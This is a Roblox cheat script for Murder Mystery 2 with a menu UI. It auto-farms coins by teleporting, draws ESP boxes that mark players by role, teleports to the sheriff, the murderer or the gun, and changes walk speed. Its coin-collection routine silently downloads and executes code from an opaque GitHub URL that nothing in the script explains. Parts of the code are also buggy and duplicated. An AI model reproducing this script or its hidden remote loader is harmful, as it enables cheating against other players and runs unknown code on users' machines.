local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")

-- Lock variable to prevent multiple script executions
local isRunning = false
local coinCollectorThread
local hasReset = false -- Flag to track if the character has been reset
local hasExecutedOnce = false -- Flag to ensure second script executes only once

-- Default tween speed
local TWEEN_SPEED = 20
local TELEPORT_DISTANCE = 200

-- Function to execute the coin collection script
local function startCoinCollector()
    if isRunning then return end
    isRunning = true

    -- Get the local player
    local localPlayer = Players.LocalPlayer

    -- Function to get the current character and ensure it's fully loaded
    local function getCharacter()
        return localPlayer.Character or localPlayer.CharacterAdded:Wait()
    end

    -- Initialize character and humanoidRootPart
    local function initializeCharacter()
        local character = getCharacter()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
        local humanoid = character:WaitForChild("Humanoid", 5)
        return character, humanoidRootPart, humanoid
    end

    -- Variables for character and humanoid
    local character, humanoidRootPart, humanoid = initializeCharacter()

    if not humanoidRootPart then
        warn("HumanoidRootPart not found!")
        isRunning = false
        return
    end

    if not humanoid then
        warn("Humanoid not found!")
        isRunning = false
        return
    end

    -- List of possible maps and their CoinContainer paths
    local mapPaths = {
        "IceCastle",
        "SkiLodge",
        "Station",
        "LogCabin",
        "Bank2",
        "BioLab",
        "House2",
        "Factory",
        "Hospital3",
        "Hotel",
        "Mansion2",
        "MilBase",
        "Office3",
        "PoliceStation",
        "Workplace",
        "ResearchFacility",
        "ChristmasItaly"
    }

    -- Keep track of visited coins to prevent revisiting
    local visitedCoins = {}

    -- Function to find the active map's CoinContainer
    local function findActiveCoinContainer()
        for _, mapName in ipairs(mapPaths) do
            local map = Workspace:FindFirstChild(mapName)
            if map then
                local coinContainer = map:FindFirstChild("CoinContainer")
                if coinContainer then
                    return coinContainer
                end
            end
        end
        return nil
    end

    -- Function to find the nearest coin
    local function findNearestCoin(coinContainer)
        local nearestCoin = nil
        local shortestDistance = math.huge

        if coinContainer then
            for _, coin in ipairs(coinContainer:GetChildren()) do
                if coin:IsA("BasePart") and not visitedCoins[coin] then
                    local distance = (humanoidRootPart.Position - coin.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearestCoin = coin
                    end
                end
            end
        else
            warn("CoinContainer not found or empty!")
        end

        return nearestCoin
    end

    -- Function to teleport to a coin
    local function teleportToCoin(coin)
        if coin then
            humanoidRootPart.CFrame = CFrame.new(coin.Position)
            visitedCoins[coin] = true -- Mark the coin as visited
        else
            warn("No coin to teleport to!")
        end
    end

    -- Function to tween to a coin
    local function tweenToCoin(coin)
        if coin then
            visitedCoins[coin] = true -- Mark the coin as visited
            local distance = (humanoidRootPart.Position - coin.Position).Magnitude
            local tweenInfo = TweenInfo.new(distance / TWEEN_SPEED, Enum.EasingStyle.Linear)
            local goal = {CFrame = CFrame.new(coin.Position)}
            local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
            tween:Play()

            -- When the tween starts, enable auto reset
            hasReset = false -- Allow reset once the tween starts

            tween.Completed:Wait() -- Wait for the tween to finish
        else
            warn("No coin to tween to!")
        end
    end

    -- Function to play falling animation
    local function playFallingAnimation()
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
    end

    -- Function to check if all CoinVisuals are gone and reset character
    local function checkForAllCoinVisualsGone()
        local coinContainer = findActiveCoinContainer()

        if coinContainer then
            local allCoinVisualsGone = true

            -- Check if any coin still has a CoinVisual
            for _, coin in ipairs(coinContainer:GetChildren()) do
                if coin:IsA("BasePart") then
                    local coinVisual = coin:FindFirstChild("CoinVisual")
                    if coinVisual then
                        allCoinVisualsGone = false
                        break
                    end
                end
            end

            -- If all CoinVisuals are gone and the character has not reset, reset the character
            if allCoinVisualsGone and not hasReset then
                character:BreakJoints() -- Reset character
                visitedCoins = {} -- Reset visited coins to allow collection again
                hasReset = true -- Set the reset flag
                wait(1) -- Wait before continuing after reset
            end

            -- If all CoinVisuals are gone, execute the second script once
            if allCoinVisualsGone and not hasExecutedOnce then
                hasExecutedOnce = true
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezqhs/-/refs/heads/main/auxqvoa"))()
            end

            -- Stop teleporting and tweening if all CoinVisuals are gone
            if allCoinVisualsGone then
                isRunning = false
            end
        end
    end

    -- Main function to tween or teleport to nearest coins
    local function collectCoins()
        while isRunning do
            -- Ensure the character and humanoid are initialized
            if not character or not humanoidRootPart or not humanoid or not character.Parent then
                character, humanoidRootPart, humanoid = initializeCharacter()
            end

            -- Find the active map's CoinContainer
            local coinContainer = findActiveCoinContainer()
            if not coinContainer then
                warn("No active map with a CoinContainer found. Retrying...")
                wait(0.01)
                continue
            end

            -- Find the nearest coin
            local targetCoin = findNearestCoin(coinContainer)
            if not targetCoin then
                warn("No unvisited coins available in the active map. Retrying...")
                wait(0.01)
                continue
            end

            -- Check if all CoinVisuals are gone and stop if necessary
            checkForAllCoinVisualsGone()
            if not isRunning then break end -- Stop the loop if all CoinVisuals are gone

            -- Check distance and decide whether to teleport or tween
            local distanceToCoin = (humanoidRootPart.Position - targetCoin.Position).Magnitude
            if distanceToCoin >= TELEPORT_DISTANCE then
                teleportToCoin(targetCoin)
            else
                tweenToCoin(targetCoin)
            end

            -- Play falling animation during tween
            playFallingAnimation()

            -- Check if all CoinVisuals are gone and reset if necessary
            checkForAllCoinVisualsGone()

            wait(0.01) -- Add a small wait to prevent script from running too quickly
        end
    end

    -- Start the coin collection process
    collectCoins()
end

-- Function to stop the coin collector
local function stopCoinCollector()
    isRunning = false
    if coinCollectorThread then
        coinCollectorThread:Disconnect()
        coinCollectorThread = nil
    end
end

local espDrawings = {}
local espEnabled = false -- Track the toggle state

-- Function to create ESP for a player
local function createESPForPlayer(player)
    -- Don't create ESP for the local player
    if player == game.Players.LocalPlayer then return end

    -- ESP lines
    local topLine = Drawing.new("Line")
    local bottomLine = Drawing.new("Line")
    local leftLine = Drawing.new("Line")
    local rightLine = Drawing.new("Line")

    -- Store drawings for this player
    espDrawings[player] = {topLine, bottomLine, leftLine, rightLine}

    -- Update ESP on RenderStepped
    game:GetService("RunService").RenderStepped:Connect(function()
        -- Check if ESP is enabled
        if not espEnabled then
            -- Hide all lines when ESP is disabled
            for _, drawing in pairs(espDrawings[player] or {}) do
                drawing.Visible = false
            end
            return
        end

        -- Validate player character and humanoid root part
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            for _, drawing in pairs(espDrawings[player] or {}) do
                drawing.Visible = false
            end
            return
        end

        -- Draw ESP lines if player is valid
        local character = player.Character
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local camera = workspace.CurrentCamera
            local hrpPosition = hrp.Position
            local screenPos, onScreen = camera:WorldToViewportPoint(hrpPosition)

            if onScreen then
                local size = Vector3.new(2, 3, 0) * (character.Head.Size.Y)
                local topLeft = camera:WorldToViewportPoint((hrp.CFrame * CFrame.new(size.X, size.Y, 0)).p)
                local topRight = camera:WorldToViewportPoint((hrp.CFrame * CFrame.new(-size.X, size.Y, 0)).p)
                local bottomLeft = camera:WorldToViewportPoint((hrp.CFrame * CFrame.new(size.X, -size.Y, 0)).p)
                local bottomRight = camera:WorldToViewportPoint((hrp.CFrame * CFrame.new(-size.X, -size.Y, 0)).p)

                topLine.From = Vector2.new(topLeft.X, topLeft.Y)
                topLine.To = Vector2.new(topRight.X, topRight.Y)
                bottomLine.From = Vector2.new(bottomLeft.X, bottomLeft.Y)
                bottomLine.To = Vector2.new(bottomRight.X, bottomRight.Y)
                leftLine.From = Vector2.new(topLeft.X, topLeft.Y)
                leftLine.To = Vector2.new(bottomLeft.X, bottomLeft.Y)
                rightLine.From = Vector2.new(topRight.X, topRight.Y)
                rightLine.To = Vector2.new(bottomRight.X, bottomRight.Y)

                -- Determine ESP color based on player's tools
                local color = Color3.fromRGB(0, 255, 0) -- Default green

                -- Check player's tools (both in Backpack and equipped)
                local hasGun = false
                local hasKnife = false

                -- Check tools in Character
                for _, tool in pairs(character:GetChildren()) do
                    if tool:IsA("Tool") then
                        if tool.Name == "Gun" then
                            hasGun = true
                        elseif tool.Name == "Knife" then
                            hasKnife = true
                        end
                    end
                end

                -- Check tools in Backpack
                for _, tool in pairs(player.Backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        if tool.Name == "Gun" then
                            hasGun = true
                        elseif tool.Name == "Knife" then
                            hasKnife = true
                        end
                    end
                end

                -- Set color based on tool presence
                if hasGun then
                    color = Color3.fromRGB(0, 0, 255) -- Blue for Gun
                elseif hasKnife then
                    color = Color3.fromRGB(255, 0, 0) -- Red for Knife
                end

                -- Apply color to ESP lines
                for _, line in pairs({topLine, bottomLine, leftLine, rightLine}) do
                    line.Color = color
                    line.Thickness = 2
                    line.Transparency = 1
                    line.Visible = true
                end
            else
                -- Hide lines if player is not on screen
                for _, line in pairs({topLine, bottomLine, leftLine, rightLine}) do
                    line.Visible = false
                end
            end
        end
    end)
end

-- Remove ESP for a player
local function removeESPForPlayer(player)
    if espDrawings[player] then
        for _, drawing in pairs(espDrawings[player]) do
            drawing:Remove()
        end
        espDrawings[player] = nil
    end
end

-- Handle players joining and leaving
for _, player in pairs(game.Players:GetPlayers()) do
    createESPForPlayer(player)
end

game.Players.PlayerAdded:Connect(function(player)
    createESPForPlayer(player)
end)

game.Players.PlayerRemoving:Connect(function(player)
    removeESPForPlayer(player)
end)






-- Initialize MacLib and Window
local MacLib = loadstring(game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"))()

local Window = MacLib:Window({
    Title = "nil.lua | MM2",
    Subtitle = "#1 MM2 Script",
    Size = UDim2.fromOffset(750, 550),
    DragStyle = 1,
    DisabledWindowControls = {},
    ShowUserInfo = true,
    Keybind = Enum.KeyCode.RightControl,
    AcrylicBlur = true,
})

-- Create TabGroup and Tabs
local tabGroups = Window:TabGroup({ Name = "Main Tabs" })

local tabs = {
    Main = tabGroups:Tab({ Name = "Main", Image = "rbxassetid://6023426921" }),
    Settings = tabGroups:Tab({ Name = "Configurations", Image = "rbxassetid://6031280882" }),
	ESP = tabGroups:Tab({ Name = "ESP", Image = "rbxassetid://6031075931" }),
	Roles = tabGroups:Tab({ Name = "Roles", Image = "rbxassetid://6034684930" }),
	Player = tabGroups:Tab({ Name = "Player", Image = "rbxassetid://6023426921" }),



}

-- Add Sections
local sections = {
    MainSection1 = tabs.Main:Section({ Side = "Left" }),
    MainSection2 = tabs.Settings:Section({ Side = "Left" }),
	MainSection3 = tabs.ESP:Section({ Side = "Left" }),
	MainSection4 = tabs.Roles:Section({ Side = "Left" }),
	MainSection5 = tabs.Player:Section({ Side = "Left" }),
	MainSection6 = tabs.Roles:Section({ Side = "Right" }),




}

-- Add Headers and Toggles
sections.MainSection1:Header({
    Name = "Main"
})

sections.MainSection2:Header({
    Name = "Tween-Settings"
})

sections.MainSection3:Header({
    Name = "ESP Players"
})
sections.MainSection4:Header({
    Name = "Sheriff"
})
sections.MainSection6:Header({
    Name = "Murder"
})
sections.MainSection5:Header({
    Name = "Player"
})



sections.MainSection1:Toggle({
    Name = "Auto Farm Coins",
    Default = false,
    Callback = function(value)
        if value then
            if not isRunning then
                coinCollectorThread = game:GetService("RunService").Heartbeat:Connect(startCoinCollector)
            end
        else
            stopCoinCollector()
        end
    end,
}, "Toggle")


sections.MainSection2:Slider({
    Name = "Tween Speed",
    Default = 20,
    Minimum = 0,
    Maximum = 25,
    DisplayMethod = "Number",
    Precision = 0,
    Callback = function(Value)
    local newSpeed = value
    if newSpeed then
        TWEEN_SPEED = newSpeed
        print("Speed set to: " .. TWEEN_SPEED)
    else
        print("Invalid speed value!")
    end
    end
}, "Slider")

sections.MainSection3:Toggle({
    Name = "ESP",
    Default = false,
    Callback = function(value)
        espEnabled = value
        if not espEnabled then
            -- Hide all ESP drawings when disabled
            for _, drawings in pairs(espDrawings) do
                for _, drawing in pairs(drawings) do
                    drawing.Visible = false
                end
            end
        end
    end,
}, "Toggle")

sections.MainSection4:Toggle({
    Name = "Auto Grab Gun",
    Default = false,
    Callback = function(value)
	local gunvalue = value
    if gunvalue then
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Create an IntValue to store the current sheriff's UserId
local currentSheriffId = Instance.new("IntValue")
currentSheriffId.Name = "CurrentSheriffId"
currentSheriffId.Value = 0 -- Default value: No sheriff
currentSheriffId.Parent = ReplicatedStorage

-- Function to find the player who has the Gun
local function findPlayerWithGun()
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character
        local backpack = player:FindFirstChild("Backpack")

        -- Check if the player has the Gun tool in their Character or Backpack
        if (character and character:FindFirstChild("Gun")) or (backpack and backpack:FindFirstChild("Gun")) then
            return player
        end
    end
    return nil
end

-- Update the sheriff's UserId and track the sheriff's death
local function updateSheriff()
    local playerWithGun = findPlayerWithGun()
    if playerWithGun and currentSheriffId.Value ~= playerWithGun.UserId then
        currentSheriffId.Value = playerWithGun.UserId
        print("Sheriff updated to:", playerWithGun.Name) -- Debugging: Log the new sheriff's name

        -- Track the sheriff's death
        local sheriffCharacter = playerWithGun.Character
        if sheriffCharacter and sheriffCharacter:FindFirstChild("Humanoid") then
            local humanoid = sheriffCharacter.Humanoid

            humanoid.Died:Connect(function()
                print("Sheriff has died:", playerWithGun.Name) -- Debugging: Log sheriff's death

                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local localHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local sheriffHRP = sheriffCharacter:FindFirstChild("HumanoidRootPart")
                    local localHumanoid = LocalPlayer.Character:FindFirstChild("Humanoid")

                    if localHRP and sheriffHRP and localHumanoid then
                        -- Save the player's current position and humanoid stats
                        local previousPosition = localHRP.CFrame
                        local originalWalkSpeed = localHumanoid.WalkSpeed
                        local originalJumpPower = localHumanoid.JumpPower

                        print("Saving previous position:", previousPosition.Position) -- Debugging: Log saved position

                        -- Set walk speed and jump power to 0
                        localHumanoid.WalkSpeed = 0
                        localHumanoid.JumpPower = 0
                        print("Set WalkSpeed and JumpPower to 0")

                        -- Teleport to the sheriff's position
                        localHRP.CFrame = sheriffHRP.CFrame
                        print("Teleported to sheriff position:", sheriffHRP.Position) -- Debugging: Log sheriff's position

                        -- Wait for 0.5 seconds before teleporting back
                        task.wait(0.5)

                        -- Teleport back to the player's previous position
                        localHRP.CFrame = previousPosition
                        print("Teleported back to previous position:", previousPosition.Position) -- Debugging: Log teleport back position

                        -- Restore the player's walk speed and jump power
                        localHumanoid.WalkSpeed = originalWalkSpeed
                        localHumanoid.JumpPower = originalJumpPower
                        print("Restored WalkSpeed and JumpPower")
                    else
                        print("Error: Missing HumanoidRootPart or Humanoid") -- Debugging: Log if HRP or Humanoid is missing
                    end
                else
                    print("Error: Local player is missing or dead") -- Debugging: Log if the local player is unavailable
                end
            end)
        end
    elseif not playerWithGun then
        currentSheriffId.Value = 0 -- Reset if no one has the Gun
        print("No one currently has the Gun") -- Debugging: Log no sheriff
    end
end

-- Continuously update the sheriff's status
while task.wait(1) do
    updateSheriff()
end


	end

    end,
}, "Toggle")

sections.MainSection6:Button({
    Name = "Teleport To Sheriff",
    Callback = function(value)
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character:FindFirstChild("Gun") or v.Backpack:FindFirstChild("Gun") or v.Character:FindFirstChild("Gun") or v.Backpack:FindFirstChild("Gun") then
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
		
	end
		end

    end,
}, "Toggle")

sections.MainSection5:Slider({
    Name = "Player Speed",
    Default = 16,
    Minimum = 0,
    Maximum = 20,
    DisplayMethod = "Number",
    Precision = 0,
    Callback = function(Value)
	while wait(5) do
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end
	end

}, "Slider")

sections.MainSection4:Button({
    Name = "Teleport To Gun",
    Callback = function(value)
    local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Create an IntValue to store the current sheriff's UserId
local currentSheriffId = Instance.new("IntValue")
currentSheriffId.Name = "CurrentSheriffId"
currentSheriffId.Value = 0 -- Default value: No sheriff
currentSheriffId.Parent = ReplicatedStorage

-- Function to find the player who has the Gun
local function findPlayerWithGun()
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character
        local backpack = player:FindFirstChild("Backpack")

        -- Check if the player has the Gun tool in their Character or Backpack
        if (character and character:FindFirstChild("Gun")) or (backpack and backpack:FindFirstChild("Gun")) then
            return player
        end
    end
    return nil
end

-- Update the sheriff's UserId and track the sheriff's death
local function updateSheriff()
    local playerWithGun = findPlayerWithGun()
    if playerWithGun and currentSheriffId.Value ~= playerWithGun.UserId then
        currentSheriffId.Value = playerWithGun.UserId
        print("Sheriff updated to:", playerWithGun.Name) -- Debugging: Log the new sheriff's name

        -- Track the sheriff's death
        local sheriffCharacter = playerWithGun.Character
        if sheriffCharacter and sheriffCharacter:FindFirstChild("Humanoid") then
            local humanoid = sheriffCharacter.Humanoid

            humanoid.Died:Connect(function()
                print("Sheriff has died:", playerWithGun.Name) -- Debugging: Log sheriff's death

                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local localHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local sheriffHRP = sheriffCharacter:FindFirstChild("HumanoidRootPart")
                    local localHumanoid = LocalPlayer.Character:FindFirstChild("Humanoid")

                    if localHRP and sheriffHRP and localHumanoid then
                        -- Save the player's current position and humanoid stats
                        local previousPosition = localHRP.CFrame
                        local originalWalkSpeed = localHumanoid.WalkSpeed
                        local originalJumpPower = localHumanoid.JumpPower

                        print("Saving previous position:", previousPosition.Position) -- Debugging: Log saved position

                        -- Set walk speed and jump power to 0
                        localHumanoid.WalkSpeed = 0
                        localHumanoid.JumpPower = 0
                        print("Set WalkSpeed and JumpPower to 0")

                        -- Teleport to the sheriff's position
                        localHRP.CFrame = sheriffHRP.CFrame
                        print("Teleported to sheriff position:", sheriffHRP.Position) -- Debugging: Log sheriff's position

                        -- Wait for 0.5 seconds before teleporting back
                        task.wait(0.5)

                        -- Teleport back to the player's previous position
                        localHRP.CFrame = previousPosition
                        print("Teleported back to previous position:", previousPosition.Position) -- Debugging: Log teleport back position

                        -- Restore the player's walk speed and jump power
                        localHumanoid.WalkSpeed = originalWalkSpeed
                        localHumanoid.JumpPower = originalJumpPower
                        print("Restored WalkSpeed and JumpPower")
                    else
                        print("Error: Missing HumanoidRootPart or Humanoid") -- Debugging: Log if HRP or Humanoid is missing
                    end
                else
                    print("Error: Local player is missing or dead") -- Debugging: Log if the local player is unavailable
                end
            end)
        end
    elseif not playerWithGun then
        currentSheriffId.Value = playerWithGun.Name -- Reset if no one has the Gun
        print("No one currently has the Gun") -- Debugging: Log no sheriff
    end
	end

    end,
}, "Toggle")

sections.MainSection4:Button({
    Name = "Teleport To Murder",
    Callback = function(value)
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character:FindFirstChild("Knife") or v.Backpack:FindFirstChild("Knife") or v.Character:FindFirstChild("Knife") or v.Backpack:FindFirstChild("Knife") then
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
		
	end
		end

    end,
}, "Toggle")






